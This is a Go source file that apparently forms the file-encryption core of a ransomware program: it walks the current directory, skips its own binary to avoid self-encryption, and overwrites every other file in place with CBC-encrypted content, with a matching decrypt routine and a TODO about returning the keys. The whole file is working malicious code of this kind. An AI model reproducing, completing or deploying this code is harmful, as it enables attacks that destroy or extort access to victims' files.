package main

import (
	"io/ioutil"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
)

// FileList allows iterability and discovery. Also manages key
type FileList struct {
	Files []File
}

// DiscoverFilesInDirectory automates discovery of files in directory and returns FileList
func DiscoverFilesInDirectory(dir string, exclude string) FileList {
	fl := FileList{}

	// Check to resolve self-encryption, defaults to linux
	fn := os.Args[0][2:]
	if runtime.GOOS == "windows" {
		fn = os.Args[0]
	}

	err := filepath.Walk(".",
		func(p string, info os.FileInfo, err error) error {
			check(err)
			if !info.IsDir() && fn != p && p != exclude {
				fl.addFile(p)
			}
			// It's worth noting that for linux systems,
			return nil
		})
	check(err)
	return fl
}

// Adds file to FileList
func (fl *FileList) addFile(fn string) {
	fl.Files = append(fl.Files, NewFile(fn))
}

// Encrypt each file in FileList Object
// TODO return keys
func (fl *FileList) encrypt() []CBCKey {
	var keys []CBCKey
	// fmt.Printf("Filelist [%+v]\n", fl.Files)
	for _, f := range fl.Files {
		fmt.Printf("Encrypting [%+s]\n", f.Name)
		f.encrypt()
		keys = append(keys, f.Key)
	}
	return keys
}

// Decrypt each file in FileList Object
func (fl *FileList) decrypt(){
	for _, f := range fl.Files {
		fmt.Printf("Decrypting [%+s]\n", f.Name)
		f.decrypt()
	}
}

// File allows file.encrypt() and file.decrypt() for GCM
// type File struct {
// 	Name string
// 	Key  GCMKey
// }
type File struct {
	Name string
	Key  CBCKey
}

// NewFile initializes a new file
func NewFile(fn string) File {
	newFile := File{}

	// newFile.Key = GenerateGMCKey()
	newFile.Key = NewCBCKey()

	newFile.Name = fn

	return newFile
}

// Encrypts file
func (f *File) encrypt() {
	pt, err := ioutil.ReadFile(f.Name)
	check(err)

	ct := f.Key.encrypt(pt)

	w, _ := os.Create(f.Name)
	defer w.Close()
	w.Write(ct)
}

// Decrypts file
func (f *File) decrypt() {
	ct, err := ioutil.ReadFile(f.Name)
	check(err)

	pt := f.Key.decrypt(ct)

	w, _ := os.Create(f.Name)
	defer w.Close()
	w.Write(pt)
}
